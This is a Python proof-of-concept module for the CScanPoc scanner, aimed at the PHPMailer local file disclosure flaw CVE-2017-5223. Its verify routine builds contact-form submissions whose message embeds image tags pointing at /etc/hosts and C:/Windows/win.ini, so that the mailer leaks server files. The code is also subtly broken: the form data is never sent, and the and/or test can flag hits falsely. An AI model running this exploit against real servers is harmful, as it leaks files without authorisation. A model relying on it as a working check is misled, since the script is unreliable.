# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CNVD-2017-00449 '  # 平台漏洞编号
    name = 'PHPMailer信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2017-01-16'  # 漏洞公布时间
    desc = '''
    PHPMailer被许多流行的PHP开发框架使用，是世界上最流行的电子邮件生成和发送库之一。
    PHPMailer 5.0.0版本至5.2.22版本中存在本地信息泄露漏洞。攻击者可利用该漏洞获取敏感信息。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-00449 '
    cnvd_id = 'CNVD-2017-00449 '  # cnvd漏洞编号
    cve_id = 'CVE-2017-5223'  # cve编号
    product = 'PHPMailer'  # 漏洞组件名称
    product_version = 'PHPMailer PHPMailer >=5.0.0，<=5.2.22'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c5a0f019-4f81-435b-b126-f9f7b7f85a3f'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/contact.php"
            vul_url = arg + payload
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            info_payloads = ['/etc/hosts', 'C:/Windows/win.ini']
            for info_payload in info_payloads:
                data = {
                    'action': 'send',
                    'your-name': 'CNVD',
                    'your-email': 'admin@cnvd.com',
                    'cc': 'yes',
                    'your-message': '<img src="{info_payload}"'.format(info_payload=info_payload)
                }

                response = requests.get(vul_url)
                if response.status_code == 200 and 'localhost' in response.text or 'extensions' in response.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
